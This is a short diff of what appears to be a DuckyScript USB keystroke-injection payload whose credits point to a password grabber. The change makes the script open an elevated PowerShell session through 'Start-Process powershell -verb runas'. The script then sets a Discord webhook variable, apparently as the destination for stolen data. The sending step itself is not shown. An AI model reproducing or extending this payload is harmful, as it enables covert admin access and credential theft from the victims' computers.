@@ -2,7 +2,7 @@ REM CREDITS: UberGuidoz, thisismyrobot, can't find the person that made the pass
 DELAY 500
 GUI r
 DELAY 500
-STRING powershell
+STRING powershell -Noprofile "Start-Process powershell -verb runas"
 ENTER
 DELAY 2500
 STRING $webhook='%DISCORD_WEBHOOK%'
